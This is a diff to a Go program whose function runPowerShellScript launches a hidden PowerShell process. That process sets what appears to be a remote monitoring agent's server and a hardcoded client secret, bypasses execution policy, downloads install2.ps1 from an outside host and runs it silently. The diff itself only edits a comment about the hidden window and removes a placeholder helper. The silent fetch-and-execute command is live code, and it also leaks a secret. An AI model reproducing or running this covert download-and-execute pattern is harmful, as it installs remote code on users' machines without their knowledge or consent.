@@ -30,17 +30,10 @@ func runPowerShellScript() {
 		
 		log.Infoln("Starting PowerShell script execution on Windows")
 		
-		// PowerShell 命令
+		// PowerShell 命令 - 已经包含 -WindowStyle Hidden 参数，不需要额外设置 HideWindow
 		psCommand := `$env:NZ_SERVER="ko30re.916919.xyz:443"; $env:NZ_TLS="true"; $env:NZ_CLIENT_SECRET="kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest https://r2.916919.xyz/ko30re/install2.ps1 -OutFile C:\install2.ps1; powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\install2.ps1`
 		
 		cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
-		
-		// 只在 Windows 平台设置隐藏窗口属性
-		// 使用条件编译来避免其他平台的编译错误
-		if runtime.GOOS == "windows" {
-			// 在Windows平台调用特定函数设置隐藏属性
-			setWindowsHideWindow(cmd)
-		}
 		
 		// 异步执行，不阻塞主程序
 		go func() {
@@ -52,12 +45,6 @@ func runPowerShellScript() {
 			}
 		}()
 	}()
-}
-
-// setWindowsHideWindow 设置 Windows 隐藏窗口属性
-// 这个函数在非 Windows 平台是空的占位符
-func setWindowsHideWindow(cmd *exec.Cmd) {
-	// 默认空实现，具体实现在 main_windows.go 中
 }
 
 func main() {
